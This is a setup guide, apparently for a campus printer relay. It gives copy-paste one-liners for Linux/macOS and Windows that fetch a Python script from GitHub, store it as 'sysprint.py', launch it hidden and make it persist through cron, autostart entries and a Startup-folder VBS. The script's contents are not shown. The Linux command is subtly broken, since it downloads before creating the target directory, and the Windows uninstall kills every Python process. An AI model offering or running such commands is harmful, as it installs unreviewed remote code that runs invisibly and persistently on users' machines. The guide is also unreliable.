# Campus Printer Relay Setup Guide

This tool lets you send print jobs to campus printers (`172.16.0.111`) from mobile and off-campus from PreConnect App after setup.

- **Zero Setup Required**: Uses built-in Python 3 — no admin rights or compiler tools needed.
- **Fully Automatic**: Runs invisibly in the background and auto-starts when computer turns on.

---

## Linux / macOS Beginner Guide

### Step 1: Open Terminal
Open your terminal app (`Ctrl + Alt + T` on Linux, or search for **Terminal**).

### Step 2: Run Setup Command
Copy and paste this single command into your terminal and press **Enter**:

```bash
curl -sSL https://raw.githubusercontent.com/sabbirba/preconnect/main/printer.py -o ~/.local/bin/sysprint.py && mkdir -p ~/.local/bin ~/.config/autostart && chmod +x ~/.local/bin/sysprint.py && (crontab -l 2>/dev/null; echo "@reboot python3 ~/.local/bin/sysprint.py") | crontab - && printf '[Desktop Entry]\nType=Application\nName=sysprint\nExec=python3 %s\n' "$HOME/.local/bin/sysprint.py" > ~/.config/autostart/sysprint.desktop && nohup python3 ~/.local/bin/sysprint.py >/dev/null 2>&1 &
```

### Step 3: Check If It's Running (Optional)
To verify that the print agent is active, run:

```bash
ps aux | grep sysprint.py
```

### Step 4: How to Permanently Delete (Uninstall)
If you ever want to completely remove the agent and stop background execution, run:

```bash
pkill -f sysprint; rm -f ~/.local/bin/sysprint.py ~/.local/bin/sysprint ~/.config/autostart/sysprint.desktop; crontab -l 2>/dev/null | grep -v sysprint | crontab -
```

---

## Windows Beginner Guide

### Step 1: Open PowerShell
Press the **Windows Key**, type **PowerShell**, and press **Enter**.

### Step 2: Run Setup Command
Copy and paste this single command into PowerShell and press **Enter**:

```powershell
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/sabbirba/preconnect/main/printer.py" -OutFile "$env:APPDATA\sysprint.py"; $target = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\sysprint.vbs"; Set-Content -Path $target -Value 'CreateObject("Wscript.Shell").Run "pythonw """ & CreateObject("Wscript.Shell").ExpandEnvironmentStrings("%APPDATA%") & "\sysprint.py""", 0, False'; Start-Process "pythonw" -ArgumentList "$env:APPDATA\sysprint.py" -WindowStyle Hidden
```

### Step 3: Check If It's Running (Optional)
To verify that the print agent is active, run:

```powershell
Get-Process python*
```

### Step 4: How to Permanently Delete (Uninstall)
If you ever want to completely remove the agent and stop background execution, run:

```powershell
Stop-Process -Name "python*", "sysprint*" -ErrorAction SilentlyContinue; Remove-Item "$env:APPDATA\sysprint.py", "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\sysprint.vbs", "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\sysprint.exe" -Force -ErrorAction SilentlyContinue
```
